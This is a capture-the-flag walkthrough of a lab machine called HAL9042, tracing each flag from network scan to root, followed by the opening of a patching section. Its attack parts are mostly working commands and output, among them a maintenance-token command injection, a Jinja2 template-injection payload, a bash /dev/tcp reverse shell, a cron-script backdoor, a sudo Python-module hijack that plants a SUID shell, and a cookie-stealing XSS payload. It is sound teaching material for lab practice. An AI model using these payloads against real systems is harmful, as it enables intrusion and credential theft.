## boot2root / HAL9042

A reproducible walkthrough of the HAL9042 box from a black-box network position up to `root`, using the `/api/debug` command-execution bug as the way in. Every flag below is shown with the exact commands and output that produce it.

The subject splits the flags into 2 in the web tier, 8 more once you have a foothold and start pivoting through the users, and 5 extra after root. This pass covers the first 10 (2 web + 8 user). The post-root five and the decoy come later.

One thing runs through the whole box and it is worth explaining once up front. There is a flag broker, `flagd`, running as a systemd service (`/usr/local/sbin/flagd`). It opens one unix socket per user under `/run/flagd/`:

```
$ ls -la /run/flagd/
srw-rw-rw- 1 root root 0 ol.sock
srw-rw-rw- 1 root root 0 paco.sock
srw-rw-rw- 1 root root 0 sophie.sock
srw-rw-rw- 1 root root 0 wil.sock
srw-rw-rw- 1 root root 0 www.sock
```

The sockets are world-writable, but the broker checks the UID of whoever connects (via `SO_PEERCRED`) and only hands over a flag if you are the user that socket belongs to. Connect to your own socket and you get your flags. Connect to someone else's and it refuses you, and it prints the hint for how to become that user. That second behaviour is the gift: the broker is a built-in checklist that tells you both which flags exist and what the next pivot is.

Little helper I reuse the whole way down:

```
flagd() { python3 -c 'import socket,sys;s=socket.socket(socket.AF_UNIX);s.connect(sys.argv[1]);print(s.recv(4096).decode())' "$1"; }
```

So the shape of each section below is: land on a user, ask that user's socket what flags I am supposed to find here, and then go do the actual enumeration and exploitation that each of those flags is rewarding. The socket is the scoreboard. The work is the writeup.

---

## finding the machine

Booted the `.ova` on VirtualBox on my `192.168.69.0/24` lab net. Ping sweep to find the host:

```
$ nmap 192.168.69.1/24 -sn
Nmap scan report for 192.168.69.151
Host is up (0.00055s latency).
MAC Address: 08:00:27:74:FA:73 (Oracle VirtualBox virtual NIC)
```

Target is `192.168.69.151` (`.1` is my host). A default scan finds nothing in the top 1000 ports, so a full port scan with service and script detection:

```
$ nmap -sCSV -p- 192.168.69.151
PORT     STATE SERVICE VERSION
5042/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-git:
|     Git repository found!
|_    Last commit message: remove debug config before launch
| http-robots.txt: 10 disallowed entries
| /api/debug /static/js/debug.js /api/internal/ /beta/
| /flag /flag.txt /admin /the_real_flag_is_in_here
|_/definitely_not_a_trap /secret_backup_DO_NOT_READ
|_http-title: HAL9042 - Evaluation Server
6060/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
```

Two ports: a web app on `5042` and SSH on `6060`. nmap already flags three useful things: an exposed `.git` directory, a `robots.txt` stuffed with "removed, definitely" paths, and, from the git config, a real user:

```
$ curl -s http://192.168.69.151:5042/.git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
	email = paco@42network.org
	name = paco
```

So `paco` is a valid account. nginx 1.24.0 plus OpenSSH 9.6p1 puts the OS at Ubuntu 24.04 (noble).

---

### web enumeration

`robots.txt` is not protecting anything, it is a menu of everything they wanted hidden:

```
$ curl -s http://192.168.69.151:5042/robots.txt
User-agent: *
# paco: all of these were removed before launch. definitely. don't try them.
Disallow: /api/debug            # removed, returns 404 now
Disallow: /static/js/debug.js   # leftover, does nothing
Disallow: /api/internal/
Disallow: /beta/
Disallow: /flag
Disallow: /admin                # HAL is the only admin now
Disallow: /the_real_flag_is_in_here
Disallow: /definitely_not_a_trap
Disallow: /secret_backup_DO_NOT_READ
# HAL9042 reminds you: curiosity is logged. (it is always logged.)
```

The "leftover, does nothing" debug JS is the one that matters. It documents the entire debug surface of the app:

```
$ curl -s http://192.168.69.151:5042/static/js/debug.js
window.HAL_DEBUG = {
    debug_header: "X-Debug-Render",
    schema_endpoint: "/api/internal/schema",
    // legacy maintenance console - disabled in the UI, still on the server
    debug_endpoint: "/api/debug",
    note: "X-Debug-Render: true  ->  see what the template engine actually rendered"
};
```

Two attack surfaces named in one file. `/api/debug` announces exactly how it wants to be used:

```
$ curl -s http://192.168.69.151:5042/api/debug
HAL9042 debug endpoint.
usage: ?file=<path>  |  ?cmd=<command>&token=<maintenance_token>
```

So there are two primitives here: `?file=` reads a file, and `?cmd=` runs a command if I have a token. The schema endpoint confirms there is a backend daemon on `7042` and that its debug handler is "still enabled":

```
$ curl -s http://192.168.69.151:5042/api/internal/schema
{"host":"127.0.0.1","note":"debug command handler still enabled - paco",
 "port":7042,"render_debug_header":"X-Debug-Render","service":"hal9042d","transport":"tcp"}
```

`/beta/evaluate` throws a fake traceback that leaks the internal layout:

```
$ curl -s http://192.168.69.151:5042/beta/evaluate
  File "/var/www/hal9042/app.py", line 183, in beta_evaluate
RuntimeError: evaluator backend unreachable: hal9042d@127.0.0.1:7042 (see /api/internal/schema)
Internal paths: /var/www/hal9042 , /opt/hal9042/ , /var/log/hal9042/
```

Before touching the command channel, the `?file=` primitive is a straight local file read (path traversal on `os.path.join`), which is enough to confirm the human users on the box:

```
$ curl -s "http://192.168.69.151:5042/api/debug?file=../../../../etc/passwd" | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
paco:x:1001:1003::/home/paco:/bin/bash
wil:x:1002:1004::/home/wil:/bin/bash
sophie:x:1003:1005::/home/sophie:/bin/bash
ol:x:1004:1006::/home/ol:/bin/bash
hal:x:9042:9042:HAL9042 Evaluation System,I am completely operational:/home/hal:/bin/sh
```

Five story users (`paco`, `wil`, `sophie`, `ol`) plus the `hal` system account, which is exactly the set of sockets under `/run/flagd/`. Now I need the maintenance token.

The exposed `.git` is a full copy of the app, so I dump it and read the source:

```
$ git-dumper http://192.168.69.151:5042/ ./src
$ ls src
app.py  config.py  requirements.txt  static  templates
```

`config.py` is where paco left the keys under the mat. The maintenance token was committed straight into the repository:

```
$ grep -i token src/config.py
# The /api/debug console accepts this token to run diagnostic commands.
ADMIN_TOKEN = "h4l_d3bug_t0k3n_2024"
```

And `app.py` shows the debug route running `os.popen(cmd)` the moment that token matches:

```python
cmd = request.args.get("cmd")
if cmd:
    token = request.args.get("token", "")
    if token != config.ADMIN_TOKEN:
        return Response("error: invalid maintenance token\n", status=403, ...)
    out = os.popen(cmd).read()
    return Response(out, mimetype="text/plain")
```

That is command execution as the web user. Confirm it:

```
$ curl -s 'http://192.168.69.151:5042/api/debug?token=h4l_d3bug_t0k3n_2024&cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

From here I upgrade to a proper reverse shell (I use penelope) so I get a real pty and can talk to the flag socket.

---

## www-data

First thing on the shell, ask the web tier's socket what I am here to collect:

```
www-data$ flagd /run/flagd/www.sock
FLAG{r3c0n_1s_k1ng}
FLAG{g1t_n3v3r_f0rg3ts}
FLAG{s3m1_bl1nd_st1ll_burns}
FLAG{www_d4t4_1s_just_th3_b3g1nn1ng}
```

Four flags at once, the whole web tier. Each one is rewarding a specific piece of the work above and below, so here is what earns each.

### flag: FLAG{r3c0n_1s_k1ng}

This flag has no plaintext copy anywhere on the filesystem. The broker is the only thing that holds it, and it only answers a process running as uid 33, so the literal way to read it is the `www.sock` call above, from the www-data shell:

```
www-data$ flagd /run/flagd/www.sock | sed -n 1p
FLAG{r3c0n_1s_k1ng}
```

What earns it is the enumeration back in "finding the machine", and the reason it is called recon-is-king is that a normal scan hides the entire box. The default top-1000 scan comes back empty:

```
$ nmap 192.168.69.151
All 1000 scanned ports on 192.168.69.151 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)
```

Only the full-range scan exposes the two services the rest of the box hangs off:

```
$ nmap -p- 192.168.69.151
5042/tcp open  http
6060/tcp open  ssh
```

Skip the `-p-` and there is no web app, no `.git`, no foothold, nothing.

### flag: FLAG{g1t_n3v3r_f0rg3ts}

Same broker socket, the second line it hands back:

```
www-data$ flagd /run/flagd/www.sock | sed -n 2p
FLAG{g1t_n3v3r_f0rg3ts}
```

The work behind it is the exposed `.git`. nmap already flagged the directory, so I dump the whole repository with `git-dumper` and read what paco committed:

```
$ git-dumper http://192.168.69.151:5042/ src
$ cd src && git log --oneline
47f2d67 remove debug config before launch
c945265 initial HAL9042 frontend
```

The HEAD commit literally claims to "remove debug config before launch", but the config it was meant to clean up is sitting untouched in the working tree:

```
$ grep -nE 'ADMIN_TOKEN|DB_PASS|SECRET_KEY' config.py
8:DB_PASS = "Moulinette2024!"
10:SECRET_KEY = "hal9042secret"
14:ADMIN_TOKEN = "h4l_d3bug_t0k3n_2024"
```

config.py even narrates its own crime scene in the comments:

```
# paco: do NOT commit this with real values again. (it was committed. twice.)
...
# Legacy debug endpoint. "removed" in a later commit (see git log) but the route
# is still wired in app.py.
```

That `ADMIN_TOKEN` is the exact value the `/api/debug?cmd=` channel checks, so this flag and the foothold are one finding seen from two sides. Commit a secret once and git keeps it, a later cleanup commit that only touches comments does not un-commit it.

### flag: FLAG{s3m1_bl1nd_st1ll_burns}

Third line out of the same socket:

```
www-data$ flagd /run/flagd/www.sock | sed -n 3p
FLAG{s3m1_bl1nd_st1ll_burns}
```

The other code-execution bug on the box is a server-side template injection on `/evaluate`. The app concatenates the `project_name` field straight into `render_template_string`, and the `X-Debug-Render: true` header (documented in that leftover debug JS) makes it echo the rendered result back, which is what makes it exploitable rather than fully blind:

```
$ curl -s -H "X-Debug-Render: true" --data 'project_name={{7*7}}' \
       http://192.168.69.151:5042/evaluate
Project under evaluation: 49
```

`49` back means Jinja2 evaluated my input. It reaches full command execution the usual way:

```
$ curl -s -H "X-Debug-Render: true" \
  --data "project_name={{cycler.__init__.__globals__.os.popen('id').read()}}" \
  http://192.168.69.151:5042/evaluate
Project under evaluation: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I take the `/api/debug` command channel as my actual foothold, but this second door is a real bug in its own right and the socket credits it here.

### flag: FLAG{www_d4t4_1s_just_th3_b3g1nn1ng}

Fourth and last line from the socket:

```
www-data$ flagd /run/flagd/www.sock | sed -n 4p
FLAG{www_d4t4_1s_just_th3_b3g1nn1ng}
```

This one is the foothold itself, and I could only run that `flagd` command in the first place because of it. The concrete step is the token from `config.py` fed into the `?cmd=` channel, which runs as `www-data`:

```
$ curl -s 'http://192.168.69.151:5042/api/debug?token=h4l_d3bug_t0k3n_2024&cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The name is the hint: the web user is only the doorway. From here most of the box is readable and the rest of the writeup is one pivot after another.

### flag: FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}

Still as `www-data`, enumerate `/var/backups`. A tool and a note sit there, both owned by a uid with no matching name:

```
www-data$ ls -l /var/backups
-rwxr-xr-x 1 1337 1337 16016 xbackup
-rw-r--r-- 1 1337 1337   196 .xavier_uid1337.bak

www-data$ cat /var/backups/.xavier_uid1337.bak
xavier - founder - uid 1337 - account deleted 48h after asking about FORK.
deleted users leave traces. find / -uid 1337 2>/dev/null
(his little backup tool is still here too - strings it)
```

So there was a user `xavier`, uid 1337, whose account was deleted, and his files are still on disk owned by the now-orphaned uid. Following the note by uid rather than by name:

```
www-data$ find / -uid 1337 2>/dev/null -ls
/home/xavier                       (dir, drwxr-x---, unreadable as www-data)
/var/backups/xbackup
/var/backups/.xavier_uid1337.bak
/tmp/.xn
/tmp/.xn/last_message.txt
/tmp/.xn/contact_ol_nov25.txt
/tmp/.xn/.key_part
```

The tool prints only its usage when run, it never emits the flag, so the note's advice is literal, string the binary:

```
www-data$ strings /var/backups/xbackup | grep -i flag
FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}
```

The `/tmp/.xn` stash also holds key fragment 4, needed to decrypt ol's report later:

```
www-data$ cat /tmp/.xn/.key_part
uid1337
```

That report is AES encrypted and its key is split four ways, one fragment per user. A scheme file readable here lists where each part lives, so from now on I grab each `.key_part` as I land on each account:

```
    key  = sha256( part1 + part2 + part3 + part4 )
    part 1 : ol      (~/.config/.key_part)
    part 2 : wil     (~/data/.key_part)
    part 3 : sophie  (~/drafts/.key_part)
    part 4 : xavier  (/tmp/.xn/.key_part)   -> uid1337   (already have it)
```

So from now on, every time I land on a user I also grab their `.key_part`. Now the sockets tell me where to go next. As `www-data` the other sockets refuse me, but each refusal is a signpost:

```
www-data$ flagd /run/flagd/paco.sock
ERROR: unauthorized. expected uid=1001, got uid=33.
.env.old in /home/paco was never cleaned up. it holds paco's ssh password.
```

---

## paco

```
paco$ flagd /run/flagd/paco.sock
FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}
```

### flag: FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}

The socket told me where paco left the keys, and his home is readable, so I go read the file it named. paco's old deploy env was never cleaned up:

```
www-data$ cat /home/paco/.env.old
# old deploy env - paco. delete this. (you will not delete this)
DB_PASS=Moulinette2024!
SECRET_KEY=hal9042secret
# ssh creds used by the deploy bot
SSH_USER=paco
SSH_PASS=Pac0_H4L_dev!
```

That deploy password is reused for his actual shell account, so it is a clean SSH login (a real session, unlike the reverse shell):

```
$ ssh -p 6060 paco@192.168.69.151      # Pac0_H4L_dev!
paco$ id
uid=1001(paco) gid=1003(paco) groups=1003(paco)
```

paco's `TODO.md` doubles as a map of the remaining bugs:

```
paco$ cat TODO.md
# HAL9042 - paco's TODO
- [ ] disable debug mode  <- this one paco
- [ ] rotate the maintenance token in config.py (it's in git. twice.)
- [ ] remove /api/debug before launch
- [ ] fix hallucination_rate (0.61 now. it was 0.43. sophie says it's fine)
- [ ] stop committing .env files
(none of this got done. launch is J+14.)
```

And his `.bash_history` points straight at the next target, a daemon he compiled that listens on `7042`:

```
paco$ head -4 ~/.bash_history
cd /home/paco/src
gcc -O2 -o /opt/hal9042/daemon evaluator.c
nc 127.0.0.1 7042
echo "DEBUG:id" | nc 127.0.0.1 7042
```

The next socket, asked as paco, confirms the direction:

```
paco$ flagd /run/flagd/wil.sock
ERROR: unauthorized. expected uid=1002, got uid=1001.
hal9042d listens on 127.0.0.1:7042 and runs as wil. debug mode was never disabled - strings the binary.
```

---

## wil

```
wil$ flagd /run/flagd/wil.sock
FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}
```

### flag: FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}

The daemon paco built is bound to loopback on `7042` and runs as `wil`. It speaks a one-line protocol, and paco's history and the socket hint both say the same thing: the `DEBUG:` prefix was never taken out. `strings` on the binary shows the backdoor is baked in:

```
paco$ strings /opt/hal9042/daemon | grep -iE 'DEBUG|v0.4|Submit'
DEBUG:
 v0.4 (build dev)
Submit a project name to evaluate. One line per request.
```

Sending a line that starts with `DEBUG:` runs the rest as a command, as wil:

```
paco$ echo "DEBUG:id" | nc 127.0.0.1 7042
HAL9042 evaluation daemon - v0.4 (build dev)
Submit a project name to evaluate. One line per request.
> uid=1002(wil) gid=1004(wil) groups=1004(wil),1001(evalops)
```

That `evalops` group in wil's `id` matters for the next step, so I want a shell that keeps it. A quick SUID copy would give me wil's euid but not his supplementary groups (those only get set up at a real login), so I take a reverse shell through the daemon instead, which inherits the group correctly:

```
www-data$ echo "DEBUG:bash -c 'bash -i >& /dev/tcp/192.168.69.1/20000 0>&1'" | nc 127.0.0.1 7042
wil$ id
uid=1002(wil) gid=1004(wil) groups=1004(wil),1001(evalops)
```

Grab wil's key fragment while here:

```
wil$ cat ~/data/.key_part
847_4n0m4l13s
```

And the socket, as wil, points at sophie and tells me exactly how:

```
wil$ flagd /run/flagd/sophie.sock
ERROR: unauthorized. expected uid=1003, got uid=1002.
wil kept an encrypted ssh key for sophie (~wil/.ssh/id_rsa_sophie.enc). the passphrase is the most common one there is.
```

---

## sophie

```
sophie$ flagd /run/flagd/sophie.sock
FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}
```

### flag: FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}

wil kept sophie's private key, encrypted, in his own `.ssh`. Exfil it:

```
wil$ ls -la ~/.ssh
-rw------- 1 wil wil 1876 id_rsa_sophie.enc
wil$ base64 -w0 ~/.ssh/id_rsa_sophie.enc   # decode on my host as id_rsa_sophie
```

The socket hint says the passphrase is the most common password there is. Crack it and log in:

```
$ ssh2john id_rsa_sophie > sophie.hash
$ john sophie.hash --wordlist=/usr/share/wordlists/rockyou.txt
iloveyou         (id_rsa_sophie)

$ ssh -i id_rsa_sophie -p 6060 sophie@192.168.69.151   # passphrase: iloveyou
sophie$ id
uid=1003(sophie) gid=1005(sophie) groups=1005(sophie)
```

Grab sophie's key fragment:

```
sophie$ cat ~/drafts/.key_part
S0ph13_J14
```

sophie's `.bash_history` shows how the board PDF was sealed and where it went (needed after root):

```
sophie$ head ~/.bash_history
cat inbox/board_launch_order.txt
# board wants the FORK doc restricted before it goes to /root
qpdf --encrypt "Pr0j3tF0rk_J14" "Pr0j3tF0rk_J14" 256 -- fork_draft.pdf PROJET_FORK_HAL9042.pdf
sudo mv PROJET_FORK_HAL9042.pdf /root/
shred -u fork_draft.pdf
```

The socket, as sophie, points at ol and asks the question that gives away the whole pivot:

```
sophie$ flagd /run/flagd/ol.sock
ERROR: unauthorized. expected uid=1004, got uid=1003.
ol's cron runs /home/ol/scripts/check.sh as ol every 5 minutes. who can write it?
```

---

## ol

```
ol$ flagd /run/flagd/ol.sock
FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}
```

### flag: FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}

The socket asked who can write `check.sh`. Checking the file and the group answers it:

```
$ ls -l /home/ol/scripts/check.sh
-rwxrwxr-x 1 ol evalops 380 check.sh
$ grep evalops /etc/group
evalops:x:1001:wil
```

The script is owned by ol but group-writable by `evalops`, and `wil` (which I am) is the only member. ol's cron runs it every 5 minutes as ol, so, as wil, I append a payload that grabs ol's flag and key fragment when cron next fires:

```
wil$ cat >> /home/ol/scripts/check.sh <<'SH'
id > /tmp/.olid
flagd /run/flagd/ol.sock > /tmp/.olflag
cp /home/ol/.config/.key_part /tmp/.olkey
SH
# wait up to 5 minutes for cron, then:
$ cat /tmp/.olid /tmp/.olflag /tmp/.olkey
uid=1004(ol) gid=1006(ol) groups=1006(ol),1002(hal9042)
FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}
M0ul1n3tt3
```

### flag: FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}

`M0ul1n3tt3` was the last missing key fragment. All four, collected one per account:

| part | owner  | location                   | value           |
|------|--------|----------------------------|-----------------|
| 1    | ol     | `~ol/.config/.key_part`    | `M0ul1n3tt3`    |
| 2    | wil    | `~wil/data/.key_part`      | `847_4n0m4l13s` |
| 3    | sophie | `~sophie/drafts/.key_part` | `S0ph13_J14`    |
| 4    | xavier | `/tmp/.xn/.key_part`       | `uid1337`       |

paco left a helper that derives the AES key from the four parts, and ol's sealed report decrypts with it:

```
$ python3 /home/paco/scripts/encrypt.py M0ul1n3tt3 847_4n0m4l13s S0ph13_J14 uid1337
380f5c29228093385507c1a9e351610a9144105e358e35abb8539250c033b44e

$ openssl enc -d -aes-256-ecb -K 380f...b44e \
      -in /home/ol/rapport/rapport_final.enc -out /tmp/rap
$ grep -o 'FLAG{[^}]*}' /tmp/rap
FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}
```

The flag lives in the decrypted report, `/tmp/rap`, pulled out by the `grep` above.

---

## root

ol has exactly one sudo right, no password:

```
ol$ sudo -l
User ol may run the following commands on hal9042:
    (root) NOPASSWD: /opt/hal9042/scripts/report.py
```

`report.py` inserts a team-writable directory onto the Python path and then imports a module from it:

```
ol$ cat /opt/hal9042/scripts/report.py
...
sys.path.insert(0, "/opt/hal9042/lib")
import moulai_utils
...
    print("[report] evaluations today:", moulai_utils.count_today())
```

That lib directory, and the module file itself, are group-writable by `hal9042`, which is one of ol's groups:

```
ol$ id -Gn
ol hal9042
ol$ ls -lhd /opt/hal9042/lib; ls -l /opt/hal9042/lib/moulai_utils.py
drwxrwxr-x 3 root hal9042 4.0K /opt/hal9042/lib
-rw-rw-r-- 1 root hal9042  384 /opt/hal9042/lib/moulai_utils.py
```

So overwrite the module with code of my own (backing up the original first), and trigger it through sudo. `count_today()` runs as root:

```
ol$ cp /opt/hal9042/lib/moulai_utils.py /tmp/.mbak
ol$ cat > /opt/hal9042/lib/moulai_utils.py <<'PY'
import os
def count_today():
    os.system('cp /bin/bash /tmp/.rootbash; chmod 6755 /tmp/.rootbash')
    return 0
PY
ol$ sudo -n /opt/hal9042/scripts/report.py
[report] HAL9042 nightly report
[report] done.
ol$ cp /tmp/.mbak /opt/hal9042/lib/moulai_utils.py   # restore the module
ol$ /tmp/.rootbash -p
rootbash# id
uid=0(root) gid=0(root) groups=0(root)
```

Once root, enumerate the rest of the HAL9042 services. systemd labels them itself, three carry "optional Fxx" hints:

```
root# systemctl list-units --type=service | grep -i hal9042
hal9042-reviewer.service    HAL9042 grade-appeal reviewer (headless Chromium, optional F11)
hal9042-telemetry.service   HAL9042 internal telemetry endpoint (optional F14, loopback)
hal9042-whisper.service     HAL9042 UDP telemetry channel (optional F12)
hal9042d.service            HAL9042 evaluation daemon (port 7042, debug mode left on)

root# ss -tlnp | grep -E '9000|7042'; ss -ulnp | grep 1337
LISTEN 127.0.0.1:9000     (telemetry)
LISTEN 127.0.0.1:7042     (hal9042d)
UNCONN 0.0.0.0:1337       (whisper)
```

### flag: FLAG{b4sh_h1st0ry_1s_4_d14ry}

How I found it: sophie's `.bash_history`, read back on the sophie pivot, probes the endpoint directly, and once root the service list confirms what it is:

```
sophie$ grep -A1 -i telemetry ~/.bash_history
# quick check the internal telemetry endpoint is still up (F14 hint)
curl -s "http://127.0.0.1:9000/internal/telemetry"

root# systemctl list-units | grep telemetry
hal9042-telemetry.service   HAL9042 internal telemetry endpoint (optional F14, loopback)
```

Source analysis: the service binds `127.0.0.1:9000` and reads its flag from the environment, injected by systemd from `/etc/hal9042/telemetry.env` (the same env-file pattern the daemon, whisper and reviewer all use). The `/internal/telemetry` route returns that value with no authentication of any kind. The only access control is that it is bound to loopback and called "internal", and every shell on the box is already inside that boundary, so the exploit is a bare GET:

```
$ curl -s http://127.0.0.1:9000/internal/telemetry
FLAG{b4sh_h1st0ry_1s_4_d14ry}
```

### flag: FLAG{udp_1s_4_wh1sp3r}

How I found it: the service list flags a UDP channel, and unlike the loopback-only telemetry, `ss` shows it bound to every interface, so it is reachable from my attacking host, not just from the box:

```
root# systemctl list-units | grep whisper
hal9042-whisper.service   HAL9042 UDP telemetry channel (optional F12)
root# ss -ulnp | grep 1337
UNCONN 0.0.0.0:1337
```

Source analysis: `/opt/hal9042/services/whisper.py` gates the flag behind one fixed string, and both halves of that string are recoverable:

```python
PORT  = int(os.environ.get("UDP_PORT", "1337"))
MAGIC = os.environ.get("MAGIC", "KNOCK")
FLAG  = os.environ.get("FLAG", "...")
HOST  = socket.gethostname()
HANDSHAKE = f"{MAGIC} {HOST}"
...
    if msg == HANDSHAKE:
        s.sendto((FLAG + "\n").encode(), addr)   # match -> flag
    else:
        s.sendto(HINT.encode(), addr)            # miss -> HINT prints the format
```

`MAGIC` defaults to `KNOCK`, `HOST` is just the hostname (`hal9042`, from the SSH banner or `/etc/hostname`), and a wrong frame makes the service reply with `HINT`, which literally says `expected handshake: <magic> <hostname>`. The handshake is not a secret, it is a guessable string the service helps you guess:

```
$ printf 'KNOCK hal9042' | nc -u -w2 192.168.69.151 1337
FLAG{udp_1s_4_wh1sp3r}
```

### flag: FLAG{pr0c_kn0ws_4ll_s3cr3ts}

How I found it: hunting secrets in process environments. The web app's schema endpoint already advertised that the eval daemon's debug handler was "still enabled", and `strings` on the binary confirms the `DEBUG:` protocol is compiled in:

```
$ strings /opt/hal9042/daemon | grep -iE 'DEBUG|Submit'
DEBUG:
Submit a project name to evaluate. One line per request.
```

Source analysis: the daemon is `evaluator.c`, compiled by paco (`gcc -O2 -o /opt/hal9042/daemon evaluator.c`, from his history). Its `DEBUG:` branch passes the rest of the line to a shell, and systemd started the daemon with an `EnvironmentFile` (`/etc/hal9042/daemon.env`) that injects `HAL_DEV_FLAG`. Every child the daemon spawns inherits that variable, so I do not need the daemon's pid at all, the shell it spawns for my command reads it from its own `/proc/self/environ`:

```
$ echo 'DEBUG:grep -ao "HAL_DEV_FLAG=FLAG{[^}]*}" /proc/self/environ' | nc 127.0.0.1 7042
HAL9042 evaluation daemon - v0.4 (build dev)
Submit a project name to evaluate. One line per request.
> HAL_DEV_FLAG=FLAG{pr0c_kn0ws_4ll_s3cr3ts}
```

As root the same value sits in `/proc/$(pgrep -f /opt/hal9042/daemon)/environ` and in `/etc/hal9042/daemon.env`. The lesson in the name: a secret in a process environment is exposed to that process, every child of it, and root.

### flag: FLAG{h4l_r3v13ws_3v3ry_4pp34l}

How I found it: the front page and `/admin` both promise that a "reviewer" opens each appeal, and the service list confirms it is a real headless browser, not a stub:

```
root# systemctl list-units | grep reviewer
hal9042-reviewer.service   HAL9042 grade-appeal reviewer (headless Chromium, optional F11)
```

Source analysis, two files line up into XSS-to-cookie-theft. `reviewer.py` loads the flag into a cookie and opens pending appeals in Chromium:

```python
FLAG = os.environ.get("FLAG", "...")
COOKIES = [
    {"name": "hal_session", "value": SESSION, "url": APP_URL, "httpOnly": False},
    {"name": "flag",        "value": FLAG,    "url": APP_URL, "httpOnly": False},
]
def review_once(browser):
    ctx = browser.new_context()
    ctx.add_cookies(COOKIES)          # then visits each pending /appeal/<id>
```

The `flag` cookie is `httpOnly: False`, so page JavaScript can read it via `document.cookie`. And `templates/appeal_view.html` renders the appeal body through Jinja's `|safe`, which disables escaping:

```
<div class="reason">{{ appeal.reason|safe }}</div>
```

So whatever I store in an appeal's `reason` runs as script inside the bot's page, where `document.cookie` holds the flag. The one obstacle is exfil: a `fetch` to my own host is blocked by Chromium's private-network policy (the page origin is `127.0.0.1`). But `app.py` has its own store-and-echo endpoint, `/api/ingest`, which is same-origin, so I bounce the cookie through it. Store the payload as an appeal, wait one review cycle, then read back what the bot stored:

```
$ curl -s -X POST http://192.168.69.151:5042/appeal \
    --data-urlencode 'project=re-eval' \
    --data-urlencode "reason=<img src=x onerror=\"fetch('/api/ingest?c=c::'+encodeURIComponent(document.cookie))\">"

$ curl -s http://192.168.69.151:5042/api/ingest | grep -o 'flag=FLAG{[^;]*}'
flag=FLAG{h4l_r3v13ws_3v3ry_4pp34l}
```

### flag: FLAG{m0ul1n3tt3_w4s_n3v3r_ju5t_4_scr1pt}

How I found it: this one is a leaked password, not a code bug. On the sophie pivot her `.bash_history` shows exactly how the board document was sealed and where it went:

```
sophie$ grep -A1 qpdf ~/.bash_history
qpdf --encrypt "Pr0j3tF0rk_J14" "Pr0j3tF0rk_J14" 256 -- fork_draft.pdf PROJET_FORK_HAL9042.pdf
sudo mv PROJET_FORK_HAL9042.pdf /root/
```

Analysis: `qpdf --encrypt <user-password> <owner-password> 256` was run with the same string, `Pr0j3tF0rk_J14`, for both passwords, so that single value both opens the PDF and controls it. It was then moved into `/root`, which is why this flag waits until root. Read the file out and decrypt with the password straight from her history:

```
root# ls /root
PROJET_FORK_HAL9042.pdf

$ qpdf --password="Pr0j3tF0rk_J14" --decrypt PROJET_FORK_HAL9042.pdf out.pdf
$ pdftotext out.pdf - | grep -o 'FLAG{[^}]*}'
FLAG{m0ul1n3tt3_w4s_n3v3r_ju5t_4_scr1pt}
```

---

## the decoy

`robots.txt` advertises `/flag`, and it does return a flag, but it is fake:

```
$ curl -s http://192.168.69.151:5042/flag
FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}
HAL9042: I appreciate the optimism.
The flags are not lying around in /flag.
```

It is hardcoded in the app's decoy route (also on `/flag.txt` and `/the_real_flag_is_in_here`). It is the 16th `FLAG{...}` on the box and the reason a naive count comes out one too high. Do not submit it. The trap endpoints (`/admin`, `/definitely_not_a_trap`, `/secret_backup_DO_NOT_READ`) hold no flags either, just attitude.

---

## scoreboard

15 real flags, plus the 1 decoy.

| # | flag | tier | method |
|---|------|------|--------|
| 1 | `r3c0n_1s_k1ng` | web | full `-p-` scan, `www.sock` |
| 2 | `g1t_n3v3r_f0rg3ts` | web | `.git` dump, secrets in `config.py` |
| 3 | `s3m1_bl1nd_st1ll_burns` | www-data | SSTI on `/evaluate` |
| 4 | `www_d4t4_1s_just_th3_b3g1nn1ng` | www-data | `/api/debug?cmd=` RCE |
| 5 | `d3l3t3d_us3rs_l34v3_tr4c3s` | www-data | `strings /var/backups/xbackup` |
| 6 | `p4c0_l3ft_th3_k3ys_und3r_th3_m4t` | paco | reused password in `.env.old` |
| 7 | `d3bug_m0d3_1s_4_f34tur3_r1ght` | wil | `DEBUG:` backdoor on `7042` |
| 8 | `w1l_kn3w_f1rst_n0b0dy_l1st3n3d` | sophie | wil's stashed key, weak passphrase |
| 9 | `cr0n_j0bs_4r3_tr4ps_4nd_g1fts` | ol | group-writable cron `check.sh` |
| 10 | `x4v13r_w4s_3r4s3d_but_n0t_g0n3` | ol | four key fragments, decrypt the report |
| 11 | `b4sh_h1st0ry_1s_4_d14ry` | post-root | loopback telemetry `:9000` |
| 12 | `udp_1s_4_wh1sp3r` | post-root | UDP knock `:1337` |
| 13 | `pr0c_kn0ws_4ll_s3cr3ts` | post-root | daemon env via `/proc` |
| 14 | `h4l_r3v13ws_3v3ry_4pp34l` | post-root | stored XSS in `/appeal` |
| 15 | `m0ul1n3tt3_w4s_n3v3r_ju5t_4_scr1pt` | post-root | decrypt the `/root` PDF |
| - | `n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks` | decoy | web `/flag`, ignore |

---

## patching the vulnerabilities

Every flag on this box maps to one concrete hygiene failure. Grouped by where it bit.

### the web app

- **Exposed `.git/`.** Never deploy the repository into the web root. Ship build artifacts only, and block it at the edge: `location ~ /\.git { deny all; return 404; }`.
- **Secrets committed to git.** `ADMIN_TOKEN`, `DB_PASS`, and `SECRET_KEY` are all in `config.py`. Move them to environment or a secret manager, rotate every value that ever touched the repo, and purge history with `git filter-repo`. A later "cleanup" commit does not remove a blob.
